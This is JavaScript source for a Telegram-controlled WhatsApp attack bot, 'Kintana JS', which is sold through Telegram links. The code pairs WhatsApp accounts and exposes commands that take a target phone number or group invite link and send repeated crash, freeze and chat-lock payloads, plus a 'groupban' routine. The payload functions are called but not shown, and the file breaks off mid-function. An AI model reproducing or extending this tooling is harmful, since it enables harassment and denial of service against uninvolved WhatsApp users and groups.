const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const axios = require('axios');
const fs = require("fs");
const readline = require('readline');
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const FormData = require('form-data');
const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });

const RICH_CSS = `<style>
  table { width: 100%; border-collapse: collapse; margin: 10px 0; }
  th, td { text-align: center !important; padding: 8px; border: 1px solid #555; }
  th { background-color: #2b2b2b; color: #fff; font-weight: bold; }
</style>`;

async function sendRichMenu(chatId, html, replyToMessageId = null) {
  const token = bot.token;
  const payload = {
    chat_id: chatId,
    rich_message: { html: RICH_CSS + html }
  };
  if (replyToMessageId) payload.reply_parameters = { message_id: replyToMessageId };
  try {
    await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, payload);
  } catch (e) {
    console.error("sendRichMenu error:", e?.response?.data || e.message);
  }
}

async function editRichMenu(chatId, messageId, html) {
  const token = bot.token;
  try {
    await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
      chat_id: chatId,
      message_id: messageId,
      rich_message: { html: RICH_CSS + html }
    });
  } catch (e) {
    try { await bot.deleteMessage(chatId, messageId); } catch (_) {}
    await sendRichMenu(chatId, html);
  }
}

function lower(text) {
  return String(text || "").toLowerCase();
}

const BLOCKCMD_PATH = "./lib/database/blockcmd.json";
const BLOCKED_CMD_PATH = "./lib/database/blocked_commands.json";

let blockCmdEnabled = false;
let blockedCommands = []; 

try {
  if (fs.existsSync(BLOCKCMD_PATH)) {
    const _bc = JSON.parse(fs.readFileSync(BLOCKCMD_PATH));
    blockCmdEnabled = !!_bc.enabled;
  }
} catch (e) { console.error("blockcmd load:", e); }

try {
  if (fs.existsSync(BLOCKED_CMD_PATH)) {
    const _bl = JSON.parse(fs.readFileSync(BLOCKED_CMD_PATH));
    if (Array.isArray(_bl.blocked)) blockedCommands = _bl.blocked;
  }
} catch (e) { console.error("blocked_commands load:", e); }

function saveBlockCmd() {
  try {
    if (!fs.existsSync("./lib/database")) fs.mkdirSync("./lib/database", { recursive: true });
    fs.writeFileSync(BLOCKCMD_PATH, JSON.stringify({ enabled: blockCmdEnabled }, null, 2));
  } catch (e) { console.error("blockcmd save:", e); }
}

function saveBlockedCommands() {
  try {
    if (!fs.existsSync("./lib/database")) fs.mkdirSync("./lib/database", { recursive: true });
    fs.writeFileSync(BLOCKED_CMD_PATH, JSON.stringify({ blocked: blockedCommands }, null, 2));
  } catch (e) { console.error("blocked_commands save:", e); }
}

function extractCommand(text) {
  if (!text) return null;
  const trimmed = String(text).trim();
  if (!trimmed.startsWith("/")) return null;
  const firstToken = trimmed.split(/\s+/)[0];
  const cmd = firstToken.split("@")[0].toLowerCase();
  if (!/^\/[a-zA-Z0-9_]+$/.test(cmd)) return null;
  return cmd;
}

const PROTECTED_COMMANDS = [
  "/blockcmd", "/block", "/unblock", "/listblock"
];

function isCommandBlocked(text) {
  const cmd = extractCommand(text);
  if (!cmd) return false;
  if (PROTECTED_COMMANDS.includes(cmd)) return false;
  return blockedCommands.includes(cmd);
}

const _origOnText = bot.onText.bind(bot);
bot.onText = function (regex, callback) {
  return _origOnText(regex, (msg, match) => {
    try {
      const fromId = msg.from?.id?.toString() || "";
      const chatId = String(msg.chat?.id || "");
      const text = msg.text || "";

      const re = new RegExp(regex.source, regex.flags.replace("g", ""));
      const localMatch = text.match(re);
      if (!localMatch) return;

      const isOwnerUser = isOwner(fromId);
      const isAdminUser = adminUsers.map(String).includes(fromId);
      const isPremiumUser = premiumUsers.map(String).includes(fromId);
      const isMurbugGroup = murbugGC.includes(chatId);

      const bypassBlockedCommand = isOwnerUser;
      const bypassBlockCmd = isOwnerUser ||
        (blockCmdEnabled && (isAdminUser || isPremiumUser || isMurbugGroup));

      const isBlockCmdCtrl = /^\/(blockcmd|block|unblock|listblock)\b/i.test(text);
      if (blockCmdEnabled && !bypassBlockCmd && !isBlockCmdCtrl) {
        const html = `<h3>access denied</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>locked by owner</td></tr>
<tr><td>action</td><td>purchase the script to gain access</td></tr>
<tr><td>contact</td><td>@heysaka</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`;
        sendRichMenu(msg.chat.id, html, msg.message_id);
        return;
      }

      const invokedCmd = extractCommand(text);
      if (!bypassBlockedCommand && invokedCmd && blockedCommands.includes(invokedCmd)) {
        const html = `<h3>command blocked</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${invokedCmd}</td></tr>
<tr><td>status</td><td>this command is currently unavailable</td></tr>
<tr><td>contact</td><td>@heysaka</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`;
        sendRichMenu(msg.chat.id, html, msg.message_id);
        return;
      }

      return callback(msg, localMatch);
    } catch (e) {
      console.error("middleware error:", e);
      return;
    }
  });
};

let premiumUsers = JSON.parse(fs.readFileSync('./lib/database/prem.json'));
let adminUsers = JSON.parse(fs.readFileSync('./lib/database/admin.json'));

function getGreeting() {
    const hours = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta", hour: "numeric", hour12: false });
    const hour = parseInt(hours, 10);
    if (hour >= 3 && hour < 11) return "good morning";
    if (hour >= 11 && hour < 15) return "good afternoon";
    if (hour >= 15 && hour < 18) return "good evening";
    return "good night";
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`file ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`error updating ${filePath}:`, error.message);
            }
        }
    });
};
watchFile('./lib/database/prem.json', (data) => (premiumUsers = data));
watchFile('./lib/database/admin.json', (data) => (adminUsers = data));

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

let murbugGC = []
if (fs.existsSync("./lib/database/StudentBugGroup.json")) {
  murbugGC = JSON.parse(fs.readFileSync("./lib/database/StudentBugGroup.json"))
}

function saveMurbugGC() {
  try {
    if (!fs.existsSync("./lib/database")) fs.mkdirSync("./lib/database", { recursive: true });
    fs.writeFileSync("./lib/database/StudentBugGroup.json", JSON.stringify(murbugGC, null, 2));
  } catch (e) { console.error("saveMurbugGC:", e); }
}

function savePremiumUsers() {
    fs.writeFileSync('./lib/database/prem.json', JSON.stringify(premiumUsers, null, 2));
};
function saveAdminUsers() {
    fs.writeFileSync('./lib/database/admin.json', JSON.stringify(adminUsers, null, 2));
};
const RECONNECT_INTERVAL = 60000;

async function restricted(chatid) {
    const html = `<h3>restricted</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>access denied</td></tr>
<tr><td>reason</td><td>this feature is restricted for you</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`;
    await sendRichMenu(chatid, html);
}

const DEVELOPER = "1189546122";
const sessions = new Map();
const waSessions = new Map();
const botwaNumbers = new Set();
const SESSIONS_DIR = "./lib/sessions";
const SESSIONS_FILE = "./lib/sessions/active_sessions.json";

function saveActiveSessions(botNumber, type = "public", ownerId = null) {
  try {
    let sessionsData = {};
    if (fs.existsSync(SESSIONS_FILE)) {
      sessionsData = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    }
    sessionsData[botNumber] = { type, ownerId };
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsData, null, 2));
  } catch (error) {
    console.error("error saving session:", error);
  }
}

function removeActiveSession(botNumber) {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const sessionsData = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      delete sessionsData[botNumber];
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsData, null, 2));
    }
  } catch (error) {
    console.error("error removing session:", error);
  }
}

bot.on("message", (msg) => {
  try {
    const text = msg.text || msg.caption || "";
    if (!text) return;

    const pushname = msg.from?.first_name
      ? `${msg.from.first_name}${msg.from.last_name ? " " + msg.from.last_name : ""}`
      : (msg.from?.username || "User");
    const senderNumber = msg.from?.id || "-";

    console.log('\x1b[30m--------------------\x1b[0m');
    console.log(chalk.bgHex("#4a69bd").bold(`New Message`));
    console.log(
      chalk.bgHex("#ffffff").black(
        `   Tanggal: ${new Date().toLocaleString()} \n` +
        `   Pesan: ${text} \n` +
        `   Pengirim: ${pushname} \n` +
        `   JID: ${senderNumber} \n`
      )
    );
    console.log();
  } catch (e) {
    console.error("tg log error:", e?.message);
  }
});

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeSessions = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      const entries = Object.entries(activeSessions);
      console.log(`-----------------\nfound ${entries.length} active whatsapp sessions\n-----------------`);

      for (const [botNumber, data] of entries) {
        const type = typeof data === "string" ? data : (data.type || "public");
        if (type === "wa") {
          console.log(`[init] skip ${botNumber} (botwa)`);
          continue;
        }
        let ownerId = null;
        if (typeof data === "object") ownerId = data.ownerId || null;
        await connectWithRetry(botNumber, type, 1, 3, ownerId);
      }
    }
  } catch (error) {
    console.error("error initializing whatsapp connections:", error);
  }
}

async function connectWithRetry(botNumber, type = "public", attempt = 1, maxAttempts = 3, ownerId = null) {
  const sessionDir = createSessionDir(botNumber);

  try {
    console.log(`-----------------\nattempting to connect whatsapp: ${botNumber} (${type.toUpperCase()}) (attempt ${attempt}/${maxAttempts})\n-----------------`);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: P({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    const isConnected = await new Promise((resolve) => {
      const timeout = setTimeout(() => {
        sock.ev.off('connection.update', connectionHandler);
        resolve(false);
      }, 10000);

      const connectionHandler = (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "open") {
          clearTimeout(timeout);
          console.log(`-----------------------\nbot ${botNumber} (${type}) connected!\n-----------------------`);
          sessions.set(botNumber, { sock, type, ownerId });
          sock.ev.on("creds.update", saveCreds);
          resolve(true);
        } else if (connection === "close") {
          clearTimeout(timeout);
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          if (!shouldReconnect) {
            sessions.delete(botNumber);
            removeActiveSession(botNumber);
            console.log(`bot ${botNumber} logged out permanently, session deleted.`);
          }
          resolve(shouldReconnect ? false : 'loggedOut');
        }
      };

      sock.ev.on('connection.update', connectionHandler);
    });

    if (isConnected === true) {
      return;
    } else if (isConnected === 'loggedOut') {
      throw new Error('logged out');
    }

    if (attempt < maxAttempts) {
      await new Promise(resolve => setTimeout(resolve, 2000));
      return connectWithRetry(botNumber, type, attempt + 1, maxAttempts, ownerId);
    } else {
      throw new Error('failed after 3 attempts');
    }

  } catch (error) {
    console.error(`-----------------\nerror connecting bot ${botNumber}:`, error.message);

    if (attempt >= maxAttempts || error.message === 'logged out') {
      console.log(`-----------------\ndeleting session for bot ${botNumber}...\n`);
      removeActiveSession(botNumber);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
      console.log(`-----------------\nsession for bot ${botNumber} has been deleted\n-----------------`);
    }
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId, type = "public", ownerId = null) {
  if (botwaNumbers.has(botNumber)) {
    console.log(`[connectToWhatsApp] skip ${botNumber} (botwa)`);
    return;
  }
  const token = bot.token;
  let statusMessageId = null;

  try {
    const initHtml = `<h3>whatsapp connection</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>bot</td><td>${botNumber}</td></tr>
<tr><td>type</td><td>${type.toUpperCase()}</td></tr>
<tr><td>status</td><td>initializing...</td></tr>
</table>`;
    const res = await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
      chat_id: chatId,
      rich_message: { html: RICH_CSS + initHtml }
    });
    statusMessageId = res?.data?.result?.message_id;
  } catch (e) {
    console.error("failed to send init message:", e?.message);
  }

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  const updateStatus = async (title, rows) => {
    if (!statusMessageId) return;
    let rowsHtml = "";
    for (const [k, v] of rows) {
      rowsHtml += `<tr><td>${k}</td><td>${v}</td></tr>\n`;
    }
    const html = `<h3>${title}</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
${rowsHtml}
</table>`;
    try {
      await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
        chat_id: chatId,
        message_id: statusMessageId,
        rich_message: { html: RICH_CSS + html }
      });
    } catch (e) {
      console.error("failed to edit status:", e?.message);
    }
  };

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await updateStatus("whatsapp connection", [
          ["bot", botNumber],
          ["type", type.toUpperCase()],
          ["status", "reconnecting..."]
        ]);
        await connectToWhatsApp(botNumber, chatId, type, ownerId);
      } else {
        sessions.delete(botNumber);
        removeActiveSession(botNumber);
        await updateStatus("whatsapp connection", [
          ["bot", botNumber],
          ["type", type.toUpperCase()],
          ["status", "connection failed"]
        ]);
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, { sock, type, ownerId });
      saveActiveSessions(botNumber, type, ownerId);

      await updateStatus("whatsapp connection", [
        ["bot", botNumber],
        ["type", type.toUpperCase()],
        ["status", "successfully connected"]
      ]);
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        let customcode = "SAKA4444";
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, customcode);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await updateStatus("whatsapp pairing", [
            ["bot", botNumber],
            ["type", type.toUpperCase()],
            ["pairing code", `<b>${formattedCode}</b>`],
            ["status", "enter code in whatsapp"]
          ]);
        }
      } catch (error) {
        console.error("error requesting pairing code:", error);
        await updateStatus("whatsapp connection", [
          ["bot", botNumber],
          ["type", type.toUpperCase()],
          ["status", "error"],
          ["message", error.message]
        ]);
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

const WA_PAIRING_CODE = "SAKA4444";
const MAX_WA_BOTS = 10;

function canAddMoreWABots() {
  const activeCount = Array.from(waSessions.values()).filter(d => d.type === "wa" || d.sock).length;
  return activeCount < MAX_WA_BOTS;
}

async function sendWAMenu(sock, from, mek, sender) {
  const pushname = mek.pushName || "User";
  const uptime = process.uptime();
  const uptimeStr = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m`;
  const greeting = getGreeting();

  const expiredDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);
  const expiredStr = expiredDate.toLocaleDateString("id-ID", {
    day: "2-digit", month: "short", year: "numeric"
  });

  const bodyText = `\`「 KINTANA JS 」\`
 ${greeting}, *${pushname}*
  Bot: Kintana JavaScript
  Versi: 10.0.0
  Uptime: ${uptimeStr}
  Platform: WhatsApp

\`「 MENU UTAMA 」\`
.menu    - menu ini
.ping    - cek respon
.owner   - kontak owner
.status  - status bot

\`「 ANDROID BUG 」\`
.delayhard 62xxx
.lockchat 62xxx
.desahanmanja 62xxx
.blankclick 62xxx
.frezehard 62xxx

\`「 GROUP BUG 」\`
.groupcrash (link)
.groupban (link)
.bubar (bug in place)

Ketik dengan awalan titik (.)

- Kintana JavaScript
Berakhir pada ${expiredStr}`;

  try {
    const imagePayload = await prepareWAMessageMedia({
      image: { url: "https://files.catbox.moe/f0sy28.jpg" }
    }, { upload: sock.waUploadToServer, mediaType: "image" });

    const msg = generateWAMessageFromContent(from, proto.Message.fromObject({
      interactiveMessage: {
        header: {
          title: "> Credit By H3ysaka",
          subtitle: "WhatsApp Bug Script",
          hasMediaAttachment: true,
          ...imagePayload
        },
        body: { text: bodyText },
        footer: { text: `Berakhir pada ${expiredStr}` },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Channel Telegram",
                url: "https://t.me/kintanaofficial",
                merchant_url: "https://t.me/kintanaofficial"
              })
            },
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Creator",
                url: "https://t.me/heysaka",
                merchant_url: "https://t.me/heysaka"
              })
            },
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Buy Script",
                url: "https://t.me/kintanaoffcbot",
                merchant_url: "https://t.me/kintanaoffcbot"
              })
            }
          ]
        }
      }
    }), { quoted: mek });

    await sock.relayMessage(from, msg.message, { messageId: msg.key.id });

  } catch (err) {
    console.error("[botwa] interactive menu error, fallback:", err?.message);

    try {
      await sock.sendMessage(from, {
        text: bodyText,
        contextInfo: {
          mentionedJid: [sender],
          externalAdReply: {
            title: "Kintana JavaScript",
            body: "WhatsApp Bug Script by Heysaka",
            thumbnailUrl: "https://files.catbox.moe/f0sy28.jpg",
            sourceUrl: "https://t.me/kintanaofficial",
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: false
          }
        }
      }, { quoted: mek });
    } catch (err2) {
      console.error("[botwa] fallback error:", err2?.message);
    }
  }
}

async function handleWAMessage(sock, number, chatUpdate) {
  try {
    const mek = chatUpdate.messages[0];
    if (!mek.message) return;
    if (chatUpdate.type !== "notify") return;

    mek.message = Object.keys(mek.message)[0] === "ephemeralMessage"
      ? mek.message.ephemeralMessage.message
      : mek.message;

    const from = mek.key.remoteJid;
    const sender = mek.key.fromMe
      ? sock.user.id.split(":")[0] + "@s.whatsapp.net"
      : (mek.key.participant || mek.key.remoteJid);

    const type = getContentType(mek.message);
    const body = (type === "conversation" && mek.message.conversation)
      || (type === "extendedTextMessage" && mek.message.extendedTextMessage.text)
      || (type === "imageMessage" && mek.message.imageMessage.caption)
      || (type === "videoMessage" && mek.message.videoMessage.caption)
      || "";

    const pushname = mek.pushName || "User";
    const senderNumber = sender.split("@")[0];

    if (mek.message) {
      console.log('\x1b[30m--------------------\x1b[0m');
      console.log(chalk.bgHex("#4a69bd").bold(`New Message`));
      console.log(
        chalk.bgHex("#ffffff").black(
          `   Tanggal: ${new Date().toLocaleString()} \n` +
          `   Pesan: ${body || type} \n` +
          `   Pengirim: ${pushname} \n` +
          `   JID: ${senderNumber} \n`
        )
      );
      console.log();
    }

if (body.trim().toLowerCase() === "bubar") {
  try {
    await sock.sendMessage(from, {
      react: { text: "☀", key: mek.key }
    });

    const groupMetadata = await sock.groupMetadata(from);
    const groupJid = groupMetadata.id;

    for (let i = 0; i < 20; i++) {
      await Promise.allSettled([
        halonyetGB(sock, groupJid).catch(() => {}),
        halonyetGB(sock, groupJid).catch(() => {}),
        halonyetGB(sock, groupJid).catch(() => {})
      ]);
      await sleep(500);
    }
  } catch (e) {}
  return;
}

    if (!body.startsWith(".")) return;

    const command = body.slice(1).trim().split(/\s+/)[0].toLowerCase();
    const args = body.trim().split(/\s+/).slice(1);

    console.log(`[wa-cmd] ${sender.split("@")[0]} -> .${command} (bot ${number})`);

    switch (command) {
      case "menu": {
        await sendWAMenu(sock, from, mek, sender);
        break;
      }

      case "ping": {
        const t0 = Date.now();
        await sock.sendMessage(from, {
          text: `Pong!\n\nRespon: ${Date.now() - t0}ms\nStatus: Online\nBot: ${number}`
        }, { quoted: mek });
        break;
      }

      case "owner": {
        await sock.sendMessage(from, {
          text: `Owner Bot\n\nTelegram: @heysaka\nChannel: t.me/kintanaofficial\nScript: Kintana JavaScript v10.0.0`
        }, { quoted: mek });
        break;
      }

      case "status": {
        const uptime = process.uptime();
        const mem = process.memoryUsage();
        const memMB = (mem.rss / 1024 / 1024).toFixed(2);
        await sock.sendMessage(from, {
          text: `Bot Status\n\nUptime: ${Math.floor(uptime / 60)} menit\nMemory: ${memMB} MB\nBot: ${number}\nVersion: 10.0.0`
        }, { quoted: mek });
        break;
      }

      case "delayhard": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .delayhard 628123456789" }, { quoted: mek });
        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim bug .delayhard ke ${args[0]}...` }, { quoted: mek });
        try {
          await bug1(sock, target);
          await bug1(sock, target);
          await sock.sendMessage(from, { text: `Bug .delayhard terkirim ke ${args[0]}` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "lockchat": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .lockchat 628123456789" }, { quoted: mek });
        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim bug .lockchat ke ${args[0]}...` }, { quoted: mek });
        try {
          await bug2(sock, target);
          await bug2(sock, target);
          await sock.sendMessage(from, { text: `Bug .lockchat terkirim ke ${args[0]}` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "blankclick": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .blankclick 628123456789" }, { quoted: mek });
        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim bug .blankclick ke ${args[0]}...` }, { quoted: mek });
        try {
          await bug3(sock, target);
          await bug3(sock, target);
          await sock.sendMessage(from, { text: `Bug .blankclick terkirim ke ${args[0]}` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "frezehard": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .frezehard 628123456789" }, { quoted: mek });
        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim bug .frezehard ke ${args[0]}...` }, { quoted: mek });
        try {
          await bug4(sock, target);
          await bug4(sock, target);
          await sock.sendMessage(from, { text: `Bug .frezehard terkirim ke ${args[0]}` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "desahanmanja": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .desahanmanja 628123456789" }, { quoted: mek });
        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim bug .lockchat ke ${args[0]}...` }, { quoted: mek });
        try {
          await bug5(sock, target);
          await bug5(sock, target);
          await sock.sendMessage(from, { text: `Bug .lockchat terkirim ke ${args[0]}` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "groupcrash": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .groupcrash https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
        const inviteCode = args[0].match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
        if (!inviteCode) return sock.sendMessage(from, { text: "Link grup tidak valid." }, { quoted: mek });
        try {
          const groupInfo = await sock.groupGetInviteInfo(inviteCode);
          const groupJid = groupInfo.id;
          await sock.sendMessage(from, { text: `Mengirim bug grup ke ${groupInfo.subject}...` }, { quoted: mek });
          for (let i = 0; i < 20; i++) {
            await Promise.allSettled([
              kitow(sock, groupJid).catch(() => {}),
              kicaumania(sock, groupJid).catch(() => {}),
              GbCrash(sock, groupJid).catch(() => {}),
              halonyetGB(sock, groupJid).catch(() => {})
            ]);
            await sleep(500);
          }
          await sock.sendMessage(from, { text: `Bug grup terkirim.` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      case "groupban": {
        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .groupban https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
        const inviteCode = args[0].match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
        if (!inviteCode) return sock.sendMessage(from, { text: "Link grup tidak valid." }, { quoted: mek });
        try {
          const groupInfo = await sock.groupGetInviteInfo(inviteCode);
          const groupJid = groupInfo.id;
          await sock.sendMessage(from, { text: `Ban grup ${groupInfo.subject}...` }, { quoted: mek });
          await bansgc(sock, groupJid);
          await sock.sendMessage(from, { text: `Selesai.` }, { quoted: mek });
        } catch (e) {
          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
        }
        break;
      }

      default:
        break;
    }
  } catch (err) {
    console.error("[botwa] messages.upsert error:", err?.message);
  }
}

bot.onText(/^\/botwa(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return restricted(chatId);

  if (!canAddMoreWABots()) {
    return sendRichMenu(chatId,
      `<h3>limit reached</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>max bots</td><td>${MAX_WA_BOTS}</td></tr>
<tr><td>status</td><td>limit tercapai, hapus bot lain dulu</td></tr>
<tr><td>command</td><td>/delbotwa &lt;nomor&gt;</td></tr>
</table>`,
      msg.message_id
    );
  }

  if (!match[1]) {
    return sendRichMenu(chatId,
      `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/botwa</td></tr>
<tr><td>example</td><td>/botwa 628123456789</td></tr>
<tr><td>max bots</td><td>${MAX_WA_BOTS}</td></tr>
</table>`,
      msg.message_id
    );
  }

  let number = match[1].replace(/[^0-9]/g, "");

  if (number.length < 10 || number.length > 15) {
    return sendRichMenu(chatId,
      `<h3>invalid number</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>input</td><td>${number}</td></tr>
<tr><td>status</td><td>format nomor tidak valid</td></tr>
</table>`,
      msg.message_id
    );
  }

  if (waSessions.has(number)) {
    const s = waSessions.get(number);
    return sendRichMenu(chatId,
      `<h3>already connected</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>number</td><td>${number}</td></tr>
<tr><td>status</td><td>already connected</td></tr>
<tr><td>since</td><td>${new Date(s.connectedAt || Date.now()).toLocaleString()}</td></tr>
</table>`,
      msg.message_id
    );
  }

  const token = bot.token;
  let statusId = null;
  try {
    const res = await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
      chat_id: chatId,
      rich_message: {
        html: RICH_CSS + `<h3>botwa connection</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>number</td><td>${number}</td></tr>
<tr><td>status</td><td>initializing...</td></tr>
</table>`
      }
    });
    statusId = res?.data?.result?.message_id;
  } catch (e) {
    console.error("botwa init status:", e?.message);
  }

  const updateStatus = async (title, rows) => {
    if (!statusId) return;
    let rowsHtml = "";
    for (const [k, v] of rows) rowsHtml += `<tr><td>${k}</td><td>${v}</td></tr>\n`;
    try {
      await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
        chat_id: chatId,
        message_id: statusId,
        rich_message: {
          html: RICH_CSS + `<h3>${title}</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
${rowsHtml}
</table>`
        }
      });
    } catch (e) {
      console.error("botwa edit status:", e?.message);
    }
  };

  const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
